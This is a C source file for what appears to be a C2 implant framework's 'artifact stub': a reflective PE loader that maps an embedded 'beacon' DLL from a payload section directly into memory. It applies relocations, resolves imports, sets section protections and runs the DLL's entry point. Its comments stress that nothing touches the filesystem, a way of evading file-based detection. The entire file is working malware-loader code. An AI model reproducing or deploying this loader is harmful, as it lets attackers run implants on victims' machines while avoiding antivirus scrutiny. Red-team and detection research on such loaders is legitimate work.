// exe_reflective.c -- Artifact stub: in-memory (reflective) PE loader.
//
// Maps the beacon DLL from .co2pay directly into memory:
//   1. Allocate image at preferred base (fallback to any address).
//   2. Copy PE headers + map sections.
//   3. Apply base relocations (HIGHLOW x86 / DIR64 x64).
//   4. Resolve imports (LoadLibraryA + GetProcAddress).
//   5. Set per-section page protections.
//   6. Call DllEntry(DLL_PROCESS_ATTACH).
//
// No temp file, no LoadLibraryW -- nothing hits the filesystem.

#include "../artifact.h"

ART_DECLARE_PAYLOAD();

typedef BOOL (WINAPI *DllEntry_t)(HINSTANCE, DWORD, LPVOID);

static BOOL rfl_load(const unsigned char *raw, unsigned int raw_size) {
    const IMAGE_DOS_HEADER      *dos;
    const IMAGE_NT_HEADERS      *nt;
    const IMAGE_SECTION_HEADER  *sec;
    LPVOID   base;
    LONGLONG delta;
    WORD     i;

    if (raw_size < sizeof(IMAGE_DOS_HEADER)) return FALSE;
    dos = (const IMAGE_DOS_HEADER *)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > raw_size) return FALSE;

    nt = (const IMAGE_NT_HEADERS *)(raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    // VirtualAlloc zero-initialises committed pages.
    base = VirtualAlloc((LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
                        nt->OptionalHeader.SizeOfImage,
                        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!base)
        base = VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
                            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!base) return FALSE;

    // 1. Headers.
    if (nt->OptionalHeader.SizeOfHeaders > raw_size) {
        VirtualFree(base, 0, MEM_RELEASE); return FALSE;
    }
    art_memcpy(base, raw, nt->OptionalHeader.SizeOfHeaders);

    // 2. Sections.
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD roff = sec[i].PointerToRawData;
        DWORD rsz  = sec[i].SizeOfRawData;
        if (!rsz) continue;
        if (roff + rsz > raw_size) continue;
        art_memcpy((BYTE *)base + sec[i].VirtualAddress, raw + roff, rsz);
    }

    // 3. Relocations.
    delta = (LONGLONG)((ULONG_PTR)base -
                       (ULONG_PTR)nt->OptionalHeader.ImageBase);
    if (delta != 0) {
        const IMAGE_DATA_DIRECTORY *dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (dd->VirtualAddress && dd->Size) {
            const IMAGE_BASE_RELOCATION *blk =
                (const IMAGE_BASE_RELOCATION *)((BYTE *)base + dd->VirtualAddress);
            const IMAGE_BASE_RELOCATION *end =
                (const IMAGE_BASE_RELOCATION *)((const BYTE *)blk + dd->Size);
            while (blk < end &&
                   blk->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                DWORD cnt = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))
                            / sizeof(WORD);
                const WORD *e = (const WORD *)(blk + 1);
                DWORD j;
                for (j = 0; j < cnt; ++j) {
                    int   type = e[j] >> 12;
                    DWORD off  = e[j] & 0x0FFF;
                    ULONG_PTR *ptr = (ULONG_PTR *)
                        ((BYTE *)base + blk->VirtualAddress + off);
                    if (type == IMAGE_REL_BASED_HIGHLOW ||
                        type == IMAGE_REL_BASED_DIR64)
                        *ptr = (ULONG_PTR)((LONG_PTR)*ptr + delta);
                }
                blk = (const IMAGE_BASE_RELOCATION *)
                          ((const BYTE *)blk + blk->SizeOfBlock);
            }
        }
    }

    // 4. Imports.
    {
        const IMAGE_DATA_DIRECTORY *dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (dd->VirtualAddress && dd->Size) {
            IMAGE_IMPORT_DESCRIPTOR *imp =
                (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)base + dd->VirtualAddress);
            for (; imp->Name; ++imp) {
                const char *lib = (const char *)((BYTE *)base + imp->Name);
                HMODULE hlib = LoadLibraryA(lib);
                if (!hlib) continue;
                IMAGE_THUNK_DATA *iat =
                    (IMAGE_THUNK_DATA *)((BYTE *)base + imp->FirstThunk);
                IMAGE_THUNK_DATA *int_ =
                    imp->OriginalFirstThunk
                        ? (IMAGE_THUNK_DATA *)((BYTE *)base + imp->OriginalFirstThunk)
                        : iat;
                for (; int_->u1.AddressOfData; ++int_, ++iat) {
                    FARPROC fn;
                    if (IMAGE_SNAP_BY_ORDINAL(int_->u1.Ordinal))
                        fn = GetProcAddress(hlib,
                                 (LPCSTR)(ULONG_PTR)IMAGE_ORDINAL(int_->u1.Ordinal));
                    else {
                        const IMAGE_IMPORT_BY_NAME *ibn =
                            (const IMAGE_IMPORT_BY_NAME *)
                                ((BYTE *)base + int_->u1.AddressOfData);
                        fn = GetProcAddress(hlib, ibn->Name);
                    }
                    iat->u1.Function = (ULONG_PTR)fn;
                }
            }
        }
    }

    // 5. Section permissions.
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD chr = sec[i].Characteristics;
        DWORD vsz = sec[i].Misc.VirtualSize;
        DWORD prot, old;
        if (!vsz) continue;
        if      (chr & IMAGE_SCN_MEM_EXECUTE) prot = PAGE_EXECUTE_READ;
        else if (chr & IMAGE_SCN_MEM_WRITE)   prot = PAGE_READWRITE;
        else                                   prot = PAGE_READONLY;
        VirtualProtect((BYTE *)base + sec[i].VirtualAddress, vsz, prot, &old);
    }

    // 6. Entry point.
    {
        DllEntry_t entry = (DllEntry_t)
            ((BYTE *)base + nt->OptionalHeader.AddressOfEntryPoint);
        entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    }
    return TRUE;
}

void __stdcall stub_main(void) {
    ART_RESOLVE_APIS();
    unsigned int sz = art_get_size(g_payload);
    if (!sz) ExitProcess(1);
    if (!rfl_load(g_payload + 12, sz)) ExitProcess(1);
    Sleep(INFINITE);
    ExitProcess(0);
}
